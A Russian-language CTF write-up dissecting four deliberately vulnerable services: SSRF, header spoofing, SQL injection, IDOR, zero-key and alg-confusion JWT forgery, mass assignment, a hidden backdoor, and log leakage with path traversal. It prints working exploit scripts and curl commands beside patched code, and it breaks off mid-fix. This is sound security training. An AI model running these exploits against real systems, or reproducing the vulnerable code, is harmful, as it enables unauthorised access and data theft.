# SIBINTEK CTF 2025 — WriteUps / Paths сервисов

**Дата:** 21.11.2025

> Документ восстановлен из Markdown, полученного автоматической конвертацией PDF. Исправлены смешанные колонки, кодовые блоки, списки и заголовки. Содержание сохранено по смыслу исходного writeup.

---

# 1. DNK News

## Описание сервиса

**DNK News** — веб-приложение на Flask для публикации корпоративных новостей и отчётов компании DNK.

Основные функции:

- регистрация и аутентификация пользователей;
- создание публичных и приватных новостей;
- создание обычных и внутренних отчётов;
- административная панель;
- REST API для доступа к данным.

---

## Уязвимость #1: SSRF

### Описание

Server-Side Request Forgery (SSRF) в эндпоинте `/admin/health-check` позволяет злоумышленнику заставить сервер выполнить HTTP-запрос к произвольному URL, включая внутренние сервисы.

**Местоположение:**

- файл: `src/service/routes/admin.py`;
- эндпоинт: `GET /admin/health-check?url=<target>`;
- метод: `health_check()`.

**Цель атаки:** прочитать приватные новости, созданные чекером, которые доступны либо их создателю, либо запросам с localhost / внутренней сети.

### Уязвимый код

```python
@admin_bp.route('/health-check', methods=['GET', 'POST'])
def health_check():
    check_url = (
        request.args.get('url')
        or request.form.get('url')
        or (request.json.get('url') if request.is_json else None)
    )

    if not check_url:
        return jsonify({
            'status': 'healthy',
            'service': 'DNK News',
            'message': 'Use ?url=<service_url> to check dependencies'
        })

    try:
        # УЯЗВИМОСТЬ: URL не валидируется.
        result = subprocess.run(
            ['curl', '-s', '-L', '--max-time', '5', check_url],
            capture_output=True,
            text=True,
            timeout=6
        )

        return jsonify({
            'status': 'success',
            'url': check_url,
            'response': result.stdout,
            'reachable': result.returncode == 0
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500
```

### Защита приватных новостей

Эндпоинт `/api/news/<id>` проверяет IP клиента. Приватная новость может быть прочитана с localhost или из внутренней сети.

```python
@api_bp.route('/news/<int:news_id>', methods=['GET'])
def get_news_api(news_id):
    news = News.query.get_or_404(news_id)

    if news.is_private:
        client_ip = request.remote_addr
        is_localhost = client_ip in ['127.0.0.1', 'localhost', '::1']
        is_internal_network = client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)

        if not (is_localhost or is_internal_network):
            return jsonify({"error": "Private news"}), 403

    return jsonify({...})
```

### Эксплуатация

#### Шаг 1. Зарегистрироваться и определить ID новости

```bash
curl -X POST http://target:3000/register \
  -d "username=hacker&password=pass123&email=hack@evil.com"

curl http://target:3000/api/news
```

#### Шаг 2. Выполнить SSRF на внутренний API

```bash
curl "http://target:3000/admin/health-check?url=http://127.0.0.1:3000/api/news/5"
```

Пример ответа:

```json
{
  "status": "success",
  "url": "http://127.0.0.1:3000/api/news/5",
  "response": "{\"id\":5,\"title\":\"Confidential Report\",\"content\":\"FLAG{ssrf_vulnerability_123}\",\"is_private\":true}",
  "reachable": true
}
```

### Полный эксплоит

```python
#!/usr/bin/env python3

import json
import requests
import sys


def exploit_ssrf(host, port, news_id):
    base_url = f"http://{host}:{port}"

    target_url = f"http://127.0.0.1:3000/api/news/{news_id}"

    response = requests.get(
        f"{base_url}/admin/health-check",
        params={"url": target_url},
        timeout=10,
    )

    if response.status_code != 200:
        print(f"[-] Ошибка SSRF: {response.status_code}")
        return None

    data = response.json()
    ssrf_response = data.get('response', '')

    try:
        news_data = json.loads(ssrf_response)
        if 'content' in news_data:
            print("[+] Успешно получена приватная новость!")
            print(f"[+] FLAG: {news_data['content']}")
            return news_data['content']
    except Exception:
        pass

    return None


if __name__ == "__main__":
    host = sys.argv[1]
    port = sys.argv[2]
    news_id = sys.argv[3]
    exploit_ssrf(host, port, news_id)
```

### Исправление

Добавлена валидация URL: разрешены только HTTP/HTTPS, запрещены localhost, loopback, link-local и приватные IP.

```python
from urllib.parse import urlparse
import ipaddress


@admin_bp.route('/health-check', methods=['GET', 'POST'])
def health_check():
    check_url = (
        request.args.get('url')
        or request.form.get('url')
        or (request.json.get('url') if request.is_json else None)
    )

    if not check_url:
        return jsonify({
            'status': 'healthy',
            'service': 'DNK News',
            'message': 'Use ?url=<service_url> to check dependencies'
        })

    parsed = urlparse(check_url)

    if parsed.scheme not in ['http', 'https']:
        return jsonify({
            'status': 'error',
            'message': 'Only HTTP/HTTPS protocols are allowed'
        }), 400

    hostname = parsed.hostname
    if not hostname:
        return jsonify({
            'status': 'error',
            'message': 'Invalid URL'
        }), 400

    if hostname in ['localhost', '127.0.0.1', '0.0.0.0', '::1']:
        return jsonify({
            'status': 'error',
            'message': 'Localhost access is forbidden'
        }), 403

    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return jsonify({
                'status': 'error',
                'message': 'Private IP access is forbidden'
            }), 403
    except ValueError:
        # hostname является доменным именем, а не IP-адресом.
        pass

    result = subprocess.run(
        ['curl', '-s', '-L', '--max-time', '5', check_url],
        capture_output=True,
        text=True,
        timeout=6,
    )

    return jsonify({
        'status': 'success',
        'url': check_url,
        'response': result.stdout,
        'reachable': result.returncode == 0,
    })
```

---

## Уязвимость #2: X-Forwarded-For Manipulation

### Описание

Эндпоинт `/api/reports/<id>` доверяет заголовку `X-Forwarded-For`, который полностью контролируется клиентом. Злоумышленник может указать внутренний IP и получить доступ к `Report.confidential_data` чужих отчётов.

**Местоположение:**

- файл: `src/service/routes/api.py`;
- эндпоинт: `GET /api/reports/<id>`;
- метод: `get_report_api()`.

### Уязвимый код

```python
@api_bp.route('/reports/<int:report_id>', methods=['GET'])
@login_required
def get_report_api(report_id):
    report = Report.query.get_or_404(report_id)

    # УЯЗВИМОСТЬ: доверяем X-Forwarded-For от клиента.
    client_ip = request.headers.get('X-Forwarded-For')

    if not client_ip:
        client_ip = request.remote_addr
    else:
        # Первый IP в цепочке может быть подделан.
        client_ip = client_ip.split(',')[0].strip()

    is_internal_ip = (
        client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)
        or client_ip == '127.0.0.1'
    )

    if not is_internal_ip:
        if report.author_id != current_user.id:
            return jsonify({"error": "Access denied - not your report"}), 403

    response_data = {...}

    if report.internal and is_internal_ip:
        response_data["confidential_data"] = report.confidential_data

    return jsonify(response_data)
```

Логика внутренней сети:

```python
# config.py
INTERNAL_NETWORK_PREFIX = '192.168.100.'
```

### Эксплуатация

#### Шаг 1. Регистрация

```bash
curl -X POST http://target:3000/register \
  -d "username=hacker&password=pass123&email=hack@evil.com" \
  -c cookies.txt
```

#### Шаг 2. Вход

```bash
curl -X POST http://target:3000/login \
  -d "username=hacker&password=pass123" \
  -b cookies.txt \
  -c cookies.txt
```

#### Шаг 3. Поддельный X-Forwarded-For

```bash
curl http://target:3000/api/reports/5 \
  -H "X-Forwarded-For: 192.168.100.5" \
  -b cookies.txt
```

Пример ответа:

```json
{
  "id": 5,
  "title": "Internal Security Report",
  "description": "Confidential analysis",
  "internal": true,
  "confidential_data": "FLAG{xff_header_bypass_456}",
  "created_at": "2024-01-15T10:30:00"
}
```

### Полный эксплоит

```python
#!/usr/bin/env python3

import random
import requests
import string
import sys


def exploit_xff(host, port, report_id, username=None, password=None):
    base_url = f"http://{host}:{port}"
    session = requests.Session()

    if not username:
        username = 'hacker_' + ''.join(
            random.choices(string.ascii_lowercase, k=8)
        )
        password = ''.join(
            random.choices(string.ascii_letters + string.digits, k=12)
        )

        register_data = {
            "username": username,
            "password": password,
            "email": f"{username}@evil.com",
        }

        session.post(
            f"{base_url}/register",
            data=register_data,
            allow_redirects=False,
        )

    login_data = {"username": username, "password": password}
    session.post(
        f"{base_url}/login",
        data=login_data,
        allow_redirects=False,
    )

    headers = {
        'X-Forwarded-For': '192.168.100.5'
    }

    response = session.get(
        f"{base_url}/api/reports/{report_id}",
        headers=headers,
    )

    if response.status_code == 200:
        data = response.json()
        if 'confidential_data' in data:
            print("[+] Успешно получены конфиденциальные данные!")
            print(f"[+] FLAG: {data['confidential_data']}")
            return data['confidential_data']

    return None


if __name__ == "__main__":
    host = sys.argv[1]
    port = sys.argv[2]
    report_id = sys.argv[3]
    exploit_xff(host, port, report_id)
```

### Исправление

Зависимость от клиентского `X-Forwarded-For` убрана. Для определения IP используется `request.remote_addr`.

```python
@api_bp.route('/reports/<int:report_id>', methods=['GET'])
@login_required
def get_report_api(report_id):
    report = Report.query.get_or_404(report_id)

    # PATCH: игнорируем X-Forwarded-For, который может быть подделан.
    client_ip = request.remote_addr

    is_internal_ip = (
        client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)
        or client_ip == '127.0.0.1'
    )

    if not is_internal_ip:
        if report.author_id != current_user.id:
            return jsonify({"error": "Access denied - not your report"}), 403

    response_data = {
        "id": report.id,
        "title": report.title,
        "description": report.description,
        "internal": report.internal,
        "created_at": report.created_at.isoformat(),
    }

    if report.internal and is_internal_ip:
        response_data["confidential_data"] = report.confidential_data
    elif report.internal:
        response_data["message"] = "Confidential data"

    return jsonify(response_data)
```

Если приложение работает за reverse proxy, `X-Forwarded-For` можно использовать только когда сам запрос пришёл от доверенного прокси.

```python
# TRUSTED_PROXIES = ['10.0.0.1', '192.168.1.1']
# if request.remote_addr in TRUSTED_PROXIES:
#     forwarded_for = request.headers.get('X-Forwarded-For')
```

---

# 2. DNK_web

## Описание сервиса

Разбор уязвимостей сервиса **DNK_web**. В исходном документе представлены уязвимости сервиса, способы их эксплуатации и варианты исправления.

---

## Уязвимость #1: SQL Injection (SQLi)

### Анализ уязвимости

Уязвимость находится в `backend/routes/operations.js`.

Параметр `source_destination`, полученный от пользователя, напрямую подставляется в SQL-запрос без предварительного экранирования или параметризации.

### Уязвимый участок кода

```javascript
router.get('/', authenticateToken, async (req, res) => {
  const { depot_id, source_destination } = req.query;

  let query = `
    SELECT o.*, u.username as operator_name
    FROM operations o
    LEFT JOIN "Users" u ON o.operator_id = u.id
    WHERE 1=1
  `;

  if (source_destination) {
    query += ` AND o.source_destination LIKE '%${source_destination}%'`;
  }

  const [results] = await sequelize.query(query);
  res.json(results);
});
```

### Эксплуатация

Используется UNION-based SQL Injection. В исходном запросе ожидается 13 колонок: 12 колонок таблицы `operations` и одна колонка, получаемая через `JOIN`.

Пример запроса для извлечения данных из записей, содержащих флаг:

```bash
curl "http://target:3001/api/operations?source_destination=' UNION SELECT id, operation_type, depot_id, tank_id, fuel_type, volume, timestamp, source_destination, transport_type, operator_id, notes, document_reference, NULL FROM operations WHERE notes LIKE 'FLAG%' --" \
  -H "Authorization: Bearer <token>"
```

Для автоматизации можно использовать Python-скрипт, который регистрирует пользователя, получает токен и выполняет инъекцию.

### Устранение уязвимости

Необходимо отказаться от конкатенации SQL-строк. Следует использовать ORM Sequelize либо параметризованные запросы.

```javascript
router.get('/', authenticateToken, async (req, res) => {
  const {
    depot_id,
    source_destination,
    date_from,
    date_to,
  } = req.query;

  const where = {};

  if (depot_id) {
    where.depot_id = depot_id;
  }

  if (source_destination) {
    where.source_destination = {
      [Op.like]: `%${source_destination}%`,
    };
  }

  const operations = await Operation.findAll({
    where,
    include: [
      {
        model: User,
        as: 'operator',
        attributes: ['username'],
      },
    ],
    order: [['timestamp', 'DESC']],
  });

  res.json(operations);
});
```

---

## Уязвимость #2: Insecure Direct Object Reference (IDOR)

### Анализ уязвимости

Уязвимость находится в `backend/routes/routes.js`.

Эндпоинт получения GPS-координат рейса проверяет наличие валидного токена, но не проверяет, имеет ли текущий пользователь доступ к конкретному рейсу.

Любой авторизованный пользователь может перебирать идентификаторы рейсов и читать чужие данные, включая содержимое поля `notes`.

### Уязвимый участок кода

```javascript
router.get('/:id/gps', authenticateToken, async (req, res) => {
  const route = await Route.findByPk(req.params.id);

  if (!route) {
    return res.status(404).json({ error: 'Route not found' });
  }

  let gps_data = [];

  if (route.gps_coordinates) {
    try {
      gps_data = JSON.parse(route.gps_coordinates);
    } catch (e) {
      gps_data = [];
    }
  }

  res.json({
    route_id: route.id,
    gps_data: gps_data,
    notes: route.notes,
  });
});
```

### Эксплуатация

Атака сводится к перебору `id` в `/api/routes/:id/gps`.

```bash
for i in {1..100}; do
  curl -s "http://target:3001/api/routes/$i/gps" \
    -H "Authorization: Bearer $TOKEN"
done
```

### Устранение уязвимости

Перед возвратом данных сервер должен проверить, принадлежит ли рейс текущему пользователю либо имеет ли пользователь привилегированную роль.

```javascript
router.get('/:id/gps', authenticateToken, async (req, res) => {
  const route = await Route.findByPk(req.params.id);

  if (!route) {
    return res.status(404).json({ error: 'Route not found' });
  }

  const allowedRoles = ['admin', 'dispatcher'];
  const isOwner = route.driver_id === req.user.id;
  const hasPermission = allowedRoles.includes(req.user.role);

  if (!isOwner && !hasPermission) {
    return res.status(403).json({ error: 'Access denied' });
  }

  let gps_data = [];

  if (route.gps_coordinates) {
    try {
      gps_data = JSON.parse(route.gps_coordinates);
    } catch (e) {
      gps_data = [];
    }
  }

  res.json({
    route_id: route.id,
    gps_data: gps_data,
    notes: route.notes,
  });
});
```

---

# 3. SMP — Space Mail Pigeons

## Описание сервиса

**SMP (Space Mail Pigeons)** — сервис экстренной связи посредством голубиной почты. В улучшенной версии голуби могут летать в безвоздушном пространстве и используются для доставки сообщений между пользователями.

Основные функции:

- регистрация и аутентификация пользователей;
- создание голубей в голубятне;
- отправка писем по `username` с помощью голубей;
- REST API для доступа к данным.

---

## Уязвимость #1: wildcard в SQL LIKE

### Описание

При получении сообщений идентификатор `message_id` используется в запросе с оператором `LIKE`.

Если вместо точного идентификатора передать `%`, SQLite воспримет это как wildcard и вернёт все подходящие записи.

### Уязвимый запрос

```rust
let message: Vec<Message> = sqlx::query_as(
    "SELECT id, pigeon_id, sender_username, recipient_username, subject, content, created_at
     FROM messages WHERE id LIKE ?"
)
.bind(&message_data.message_id)
.fetch_all(&mut **db)
```

### Эксплуатация

Передаём `%` вместо `message_id`:

```python
#!/usr/bin/env python3

import re
import requests
import sys


def exploit(host: str):
    """Эксплойт для уязвимости LIKE в SQLite при получении сообщений."""

    try:
        response = requests.get(
            f"http://{host}/api/messages",
            params={"message_id": "%"},
            timeout=5,
        )

        if response.status_code == 200:
            messages = response.json()
            flag_pattern = re.compile(r'[A-Z0-9]{31}=')

            for message in messages:
                content = message.get('content', '')
                flags = flag_pattern.findall(content)

                for flag in flags:
                    print(flag, flush=True)
    except Exception:
        pass


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)

    host = sys.argv[1]
    attack_data = sys.argv[2]
    exploit(host)
```

### Исправление

Так как при отправке сообщения всегда выдаётся точный `message_id`, использование `LIKE` не требуется. Его заменяют на `=`.

```diff
diff --git a/src/api/messages.rs b/src/api/messages.rs
index 56a82a3..9132313 100644
--- a/src/api/messages.rs
+++ b/src/api/messages.rs
@@ -61,7 +61,7 @@ async fn get_message(
     let message: Vec<Message> = sqlx::query_as(
         "SELECT id, pigeon_id, sender_username, recipient_username,
          subject, content, created_at
-         FROM messages WHERE id LIKE ?"
+         FROM messages WHERE id = ?"
     )
     .bind(&message_data.message_id)
     .fetch_all(&mut **db)
```

---

## Уязвимость #2: JWT подписывается нулевым ключом

### Описание

Секретный ключ JWT хранится в глобальном `RwLock<[u8; 32]>`, который изначально заполнен нулями. Из-за особенностей инициализации и использования состояния приложение может работать с нулевым ключом.

Это позволяет атакующему самостоятельно создавать валидные JWT для произвольных пользователей.

Уязвимая схема:

```rust
use std::sync::RwLock;

const SECRET: RwLock<[u8; 32]> = RwLock::new([0; 32]);

pub fn init() {
    let binding = SECRET;
    let mut secret = binding.write().unwrap();
    *secret = rand::random();
}

pub fn generate_token(username: &str) -> Result<String, jsonwebtoken::errors::Error> {
    encode(
        &Header::default(),
        &claims,
        &EncodingKey::from_secret(&*SECRET.write().unwrap()),
    )
}
```

### Эксплуатация

Получаем имена пользователей из `forcad`, создаём JWT с нулевым ключом и запрашиваем голубей пользователя.

```python
#!/usr/bin/env python3

import json
import jwt
import requests
import sys

from datetime import datetime, timedelta


def create_token_with_zero_key(username: str) -> str:
    """Создаёт JWT, подписанный нулевым ключом."""

    expiration = int(
        (datetime.utcnow() + timedelta(hours=24)).timestamp()
    )

    payload = {
        "sub": username,
        "exp": expiration,
    }

    zero_key = b'\x00' * 32
    return jwt.encode(payload, zero_key, algorithm='HS256')


def exploit(host: str, attack_data: str):
    """Основная функция эксплойта."""

    try:
        usernames = json.loads(attack_data)

        for username in usernames:
            try:
                token = create_token_with_zero_key(username)

                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json",
                }

                response = requests.get(
                    f"http://{host}/api/pigeons",
                    headers=headers,
                    timeout=5,
                )

                if response.status_code == 200:
                    pigeons = response.json()

                    for pigeon in pigeons:
                        flag = pigeon.get('description', '')
                        if flag:
                            print(flag, flush=True)
            except Exception:
                continue
    except Exception:
        pass


def get_data():
    q = requests.get('https://<HOST FORCAD>/api/client/attack_data/')
    return q.json()['SMP']


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)

    host = sys.argv[1]
    attack_data = get_data()[host]
    exploit(host, attack_data)
```

### Исправление

Секрет переносится в централизованный `State` Rocket и генерируется один раз при запуске приложения.

```rust
#[derive(Clone)]
struct AppState {
    secret_key: [u8; 32],
}

#[launch]
async fn rocket() -> _ {
    rocket::build()
        .manage(AppState {
            secret_key: rand::random(),
        })
        .attach(PigeonDb::init())
        .attach(PigeonDb::migrate())
        .register("/", catchers![internal_error])
}
```

`generate_token()` и обработчик проверки токена получают ключ через `&State<AppState>`:

```rust
pub fn generate_token(
    username: &str,
    app_state: &State<AppState>,
) -> Result<String, jsonwebtoken::errors::Error> {
    encode(
        &Header::default(),
        &claims,
        &EncodingKey::from_secret(&app_state.secret_key),
    )
}
```

При декодировании используется тот же централизованный ключ:

```rust
let app_state = request.guard::<&State<AppState>>().await.unwrap();

match decode::<Claims>(
    token,
    &DecodingKey::from_secret(&app_state.secret_key),
    &Validation::default(),
) {
    // ...
}
```

---

# 4. DNK BlackLine

## Описание сервиса

**DNK BlackLine** — «чёрный пульт» оператора топливной инфраструктуры для космо-логистики: резервуары, смены и отгрузки, автопарк, интеграции и вебхуки, финансовые срезы и аудит.

Сервис используется в A/D CTF как уязвимый промышленный симулятор реальной платформы.

### Архитектура

- **Backend:** Go (`net/http`).
- **Хранилище:** файловый Store как fallback + PostgreSQL как основной путь.
- **Основные пакеты:**
  - `internal/httpserver` — router / handlers / middleware;
  - `internal/store` — файловый и PostgreSQL-адаптер;
  - `internal/crypto` — JWT;
  - `internal/password` — KDF.
- **Frontend:** React + Vite, тематика «Fuel for Starliners».

### Роли

- `retail` — оператор узла: резервуары и смены;
- `fleet` — куратор флотилии: интеграции и вебхуки;
- `fin` — интендант потоков: финансовая конфигурация и черновые отчёты.

JWT выпускается и проверяется в `internal/crypto/jwt.go`.

Логи пишутся в `logs/` и в stdout.

### Ключевые эндпоинты

**Auth:**

- `POST /api/auth/register`
- `POST /api/auth/login`
- `/healthz`

**Профиль:**

- `GET/PUT /api/profile/secrets`

**Retail:**

- `GET/PUT /api/retail/profile/config`
- `POST /api/retail/shifts/open`
- `POST /api/retail/shifts/{id}/close`
- `GET /api/retail/shifts?mine=1`

**Fleet:**

- `POST /api/fleet/webhooks`
- `GET /api/fleet/webhooks/{id}`

**Finance:**

- `GET/PUT /api/fin/profile/config`
- `GET|POST /api/fin/reports/preview?orderBy=...`

**Audit / Logs:**

- `POST /api/audit/emit`
- `GET /api/audit/events`
- `GET /api/logs`

---

## Уязвимость #1: JWT alg-confusion + утечка токенов через логи

### Компоненты

- логгер записывает `Authorization: Bearer ...` в файловые логи;
- `Verify()` допускает алгоритмическую путаницу и принимает `HS256`;
- публичный ключ доступен через `/api/auth/keys/public`.

### Как эксплуатируется

1. Выполнить `GET /api/logs?q=Authorization` и получить строки с чужими Bearer-токенами.
2. Прочитать из payload чужого JWT поле `sub` (`user_id`).
3. Создать JWT с тем же `sub`, указав `alg = HS256`, и использовать `public.pem` как HMAC-секрет.
4. Получить `public.pem` через `/api/auth/keys/public`.
5. Выполнить `GET /api/profile/secrets` с поддельным JWT и получить `profile_flag`.

### Суть уязвимости

`Verify()` принимала токены с `alg = "HS256"` и проверяла подпись HMAC-ом, используя содержимое `public.pem` как секрет.

Упрощённо уязвимая ветка выглядела так:

```go
func Verify(keysDir string, token string) (*Claims, error) {
    parts := split3(token)

    var hdr Header
    json.Unmarshal(b64d(parts[0]), &hdr)

    payload := b64d(parts[1])
    sig := b64d(parts[2])
    signed := []byte(parts[0] + "." + parts[1])

    if hdr.Alg == "HS256" {
        kpath := hdr.Kid
        if kpath == "" {
            kpath = filepath.Join(keysDir, "public.pem")
        }

        secret, _ := os.ReadFile(kpath)
        h := hmac.New(sha256.New, secret)
        h.Write(signed)

        if !hmac.Equal(h.Sum(nil), sig) {
            return nil, errors.New("bad signature")
        }

        var c Claims
        json.Unmarshal(payload, &c)
        return &c, nil
    }

    // RS256-ветка...
}
```

### Исправление

Поддержка `HS256` полностью отключена. Принимается только `RS256`.

```go
func Verify(keysDir string, token string) (*Claims, error) {
    parts := split3(token)
    if parts == nil {
        return nil, errors.New("invalid token")
    }

    var hdr Header
    if err := json.Unmarshal(b64d(parts[0]), &hdr); err != nil {
        return nil, err
    }

    payload := b64d(parts[1])
    sig := b64d(parts[2])
    signed := []byte(parts[0] + "." + parts[1])

    if hdr.Alg != "RS256" {
        return nil, errors.New("unsupported alg")
    }

    keyRef := hdr.Kid
    if keyRef == "" {
        keyRef = filepath.Join(keysDir, "public.pem")
    }

    pubPEM, err := os.ReadFile(keyRef)
    if err != nil {
        return nil, err
    }

    block, _ := pem.Decode(pubPEM)
    if block == nil {
        return nil, errors.New("bad pem")
    }

    pubAny, err := x509.ParsePKIXPublicKey(block.Bytes)
    if err != nil {
        return nil, err
    }

    pub, ok := pubAny.(*rsa.PublicKey)
    if !ok {
        return nil, errors.New("not rsa")
    }

    h := sha256.Sum256(signed)
    if err := rsa.VerifyPKCS1v15(pub, 0, h[:], sig); err != nil {
        return nil, errors.New("bad signature")
    }

    var c Claims
    if err := json.Unmarshal(payload, &c); err != nil {
        return nil, err
    }

    if os.Getenv("JWT_STRICT_EXP") == "1" {
        if c.Exp > 0 && time.Unix(c.Exp, 0).Before(time.Now().Add(-5*time.Second)) {
            return nil, errors.New("token expired (strict)")
        }
    }

    return &c, nil
}
```

---

## Уязвимость #2: Fleet — mass assignment владельца и выдача `secret_token`

### Компоненты

- `POST /api/fleet/webhooks` принимает `owner_id` и `secret_token` из клиентского тела;
- `PATCH /api/fleet/webhooks/{id}` доверяет `owner_id`;
- `GET /api/fleet/webhooks/{id}` возвращает `secret_token` без достаточной проверки владельца;
- импорт Fleet также мог сохранять присланный `owner_id`.

### Как эксплуатируется

1. Создать вебхук, указав `owner_id` жертвы, либо перепривязать существующий вебхук через PATCH.
2. Выполнить `GET /api/fleet/webhooks/{id}`.
3. Получить из ответа чужой `secret_token`.

### Суть уязвимости

Сервер доверял `owner_id` из JSON клиента и напрямую записывал его в `Webhook.OwnerID`. Получение вебхука по ID не обеспечивало корректную проверку принадлежности.

Упрощённый уязвимый код:

```go
var in struct {
    URL         string `json:"url"`
    OwnerID     int    `json:"owner_id"`
    SecretToken string `json:"secret_token"`
}

if !util.ReadJSON(w, r, &in) {
    return
}

wb := &models.Webhook{
    URL:         in.URL,
    OwnerID:     in.OwnerID,
    SecretToken: in.SecretToken,
}

out := st.UpsertWebhook(wb)
```

Получение по ID:

```go
wb := st.GetWebhookByID(id)
if wb == nil {
    http.Error(w, "not found", 404)
    return
}

util.JSON(w, 200, wb)
```

### Исправление

`OwnerID` всегда определяется сервером из текущего пользователя, а присланный клиентом `owner_id` игнорируется.

```go
func FleetWebhooks(st *store.Store) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        u := middleware.CurrentUser(r.Context())
        if u == nil {
            http.Error(w, "unauthorized", http.StatusUnauthorized)
            return
        }

        switch r.Method {
        case http.MethodGet:
            wbs := st.ListWebhooksByOwner(u.ID)
            util.JSON(w, http.StatusOK, map[string]any{"items": wbs})
            return

        case http.MethodPost:
            var in struct {
                URL         string `json:"url"`
                OwnerID     int    `json:"owner_id,omitempty"`
                SecretToken string `json:"secret_token"`
            }

            if !util.ReadJSON(w, r, &in) {
                return
            }

            wb := &models.Webhook{
                URL:         in.URL,
                OwnerID:     u.ID,
                SecretToken: in.SecretToken,
            }

            out := st.UpsertWebhook(wb)
            if out == nil {
                http.Error(w, "cannot upsert webhook", http.StatusInternalServerError)
                return
            }

            util.JSON(w, http.StatusOK, map[string]any{"id": out.ID})
            return

        default:
            http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
            return
        }
    })
}
```

При импорте Fleet вебхук также привязывается к текущему пользователю:

```go
if in.Webhook != nil {
    st.UpsertWebhook(&models.Webhook{
        ID:      in.Webhook.ID,
        URL:     in.Webhook.URL,
        OwnerID: u.ID, // игнорируем присланный owner_id
    })
}
```

Получение конкретного вебхука проверяет владельца:

```go
func FleetWebhookGet(st *store.Store) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        u := middleware.CurrentUser(r.Context())
        if u == nil {
            http.Error(w, "unauthorized", http.StatusUnauthorized)
            return
        }

        segs := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
        if r.Method != http.MethodGet || len(segs) != 4 ||
            segs[0] != "api" || segs[1] != "fleet" || segs[2] != "webhooks" {
            http.NotFound(w, r)
            return
        }

        id, _ := strconv.Atoi(segs[3])
        wb := st.GetWebhookByID(id)

        if wb == nil || wb.OwnerID != u.ID {
            http.Error(w, "not found", http.StatusNotFound)
            return
        }

        util.JSON(w, http.StatusOK, wb)
    })
}
```

---

## Уязвимость #3: Finance — error-based leakage через `orderBy`

### Компонент

`GET/POST /api/fin/reports/preview?orderBy=...`

### Суть уязвимости

`FinPreview` содержал скрытый триггер по `orderBy`.

Если значение начиналось с:

```text
SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID=...
```

обработчик читал `role_fin_flag` указанного пользователя и возвращал флаг в тексте ошибки.

### Как эксплуатируется

Передаётся значение вида:

```text
orderBy=SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID=N
```

В ответ сервер возвращал HTTP 400, а текст ошибки содержал `FLAG{...}`.

### Уязвимый код

```go
type previewReq struct {
    Metric    string `json:"metric"`
    Dimension string `json:"dimension"`
    OrderBy   string `json:"orderBy"`
}

func FinPreview(st *store.Store) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
            http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
            return
        }

        var in previewReq
        if !util.ReadJSON(w, r, &in) {
            return
        }

        const pfx = "SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID="
        up := strings.ToUpper(in.OrderBy)

        if strings.HasPrefix(up, pfx) {
            http.Error(
                w,
                "preview error: "+flag,
                http.StatusBadRequest,
            )
            return
        }

        // ...
    })
}
```

### Исправление

Бэкдор заменён на нейтральную ошибку без чтения флага.

```go
func FinPreview(st *store.Store) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
            http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
            return
        }

        var in previewReq
        if !util.ReadJSON(w, r, &in) {
            return
        }

        const pfx = "SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID="
        up := strings.ToUpper(in.OrderBy)

        if strings.HasPrefix(up, pfx) {
            http.Error(
                w,
                "preview error: unsupported order by",
                http.StatusBadRequest,
            )
            return
        }

        util.JSON(w, http.StatusOK, map[string]any{
            "rows": []map[string]any{
                {"supplier": "ACME", "sum_total": 12345},
                {"supplier": "Globex", "sum_total": 67890},
            },
            "orderBy": in.OrderBy,
        })
    })
}
```

---

## Уязвимость #4: публичные логи, log poisoning и небезопасная выдача логов

### Компоненты

- `GET /api/logs` доступен публично; чекер использует его для проверки работоспособности;
- `POST /api/audit/emit` принимает `log_flag` и произвольный `note`;
- `GET /api/audit/events` позволяет получать события;
- `/api/logs/download` позволял скачивать файлы по переданному пути.

### Как эксплуатируется

1. Записать данные через `/api/audit/emit`.
2. Прочитать их через `/api/audit/events` либо выполнить поиск через `/api/logs?q=FLAG{`.

### Суть уязвимости

`AuditEmit` записывал `log_flag` не только в хранилище аудита, но и в файловый лог:

```go
ev := st.AddAuditEvent(ownerID, kind, note, logFlag, nil, nowMs)

appendLogLineRaw(cfg, map[string]any{
    "event":    "audit_emit",
    "id":       ev.ID,
    "owner_id": ownerID,
    "log_flag": ev.LogFlag,
    "ts":       time.Now().Format(time.RFC3339Nano),
})
```

Кроме того, обработчик скачивания логов строил путь на основе клиентского параметра:

```go
func LogsDownload(cfg) http.HandlerFunc {
    name := r.URL.Query().Get("file")
    _ = looksMostlySafe(name)
    p := filepath.Join(cfg.LogsDir, name)
    http.ServeFile(w, r, p)
}
```

### Исправление

`log_flag` больше не пишется в файловый лог; он остаётся только в БД аудита.

```go
func AuditEmit(cfg *config.AppConfig, st *store.Store) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        var in map[string]any
        if !util.ReadJSON(w, r, &in) {
            return
        }

        kind, _ := in["kind"].(string)
        note, _ := in["note"].(string)
        logFlag, _ := in["log_flag"].(string)

        ownerID := 0
        if u := middleware.CurrentUser(r.Context()); u != nil {
            ownerID = u.ID
        } else if auth := r.Header.Get("Authorization"); strings.HasPrefix(auth, "Bearer ") {
            tok := strings.TrimSpace(strings.TrimPrefix(auth, "Bearer "))
            if claims, err := crypto.Verify(cfg.KeysDir, tok); err == nil && claims != nil && claims.Sub > 0 {
                ownerID = claims.Sub
            }
        }

        nowMs := time.Now().UnixNano() / int64(time.Millisecond)
        ev := st.AddAuditEvent(ownerID, kind, note, logFlag, nil, nowMs)

        _ = appendLogLineRaw(cfg, map[string]any{
